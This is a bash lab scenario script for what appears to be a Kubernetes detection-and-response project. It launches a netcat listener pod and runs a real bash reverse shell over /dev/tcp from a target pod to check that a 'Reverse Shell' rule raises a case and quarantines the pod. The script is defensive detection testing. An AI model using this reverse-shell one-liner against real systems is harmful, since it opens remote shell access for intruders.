#!/usr/bin/env bash
# Real reverse shell: bash copies stdin/stdout onto a TCP socket toward a
# listener pod. Busybox has no /dev/tcp, so that redirect never matches
# K8sSoar Reverse Shell (dup of stdio onto a socket).
set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
# shellcheck source=../../scripts/lab/scenario-lib.sh
source "${ROOT}/scripts/lab/scenario-lib.sh"

SCENARIO_ID="04"
LISTENER="scenario-04-listener"
POD="scenario-04-shell"
RULE="K8sSoar Reverse Shell"

scenario_require_namespace
scenario_cleanup "$SCENARIO_ID"
kubectl delete pod "$LISTENER" "$POD" -n "$SCENARIO_NS" --ignore-not-found --wait=true --timeout=60s >/dev/null 2>&1 || true

kubectl run "$LISTENER" -n "$SCENARIO_NS" --restart=Never \
  --labels="${SCENARIO_LABEL_KEY}=${SCENARIO_ID},scenario-role=listener" \
  --image=busybox:1.36 --command -- nc -l -p 4444 >/dev/null
kubectl run "$POD" -n "$SCENARIO_NS" --restart=Never \
  --labels="${SCENARIO_LABEL_KEY}=${SCENARIO_ID},scenario-target=true" \
  --image=bash:5.2 --command -- sleep 3600 >/dev/null
kubectl wait -n "$SCENARIO_NS" --for=condition=Ready "pod/${LISTENER}" "pod/${POD}" --timeout=120s

PEER_IP=$(kubectl get pod -n "$SCENARIO_NS" "$LISTENER" -o jsonpath='{.status.podIP}')
echo ">>> Reverse shell from ${POD} to ${LISTENER} (${PEER_IP}:4444)"
kubectl exec -n "$SCENARIO_NS" "$POD" -- bash -c "bash -i >/dev/tcp/${PEER_IP}/4444 0>&1 2>&1 & sleep 2" || true

scenario_expect_case "$POD" "$RULE"
scenario_expect_quarantine "$POD"
echo "Review it: make cases"
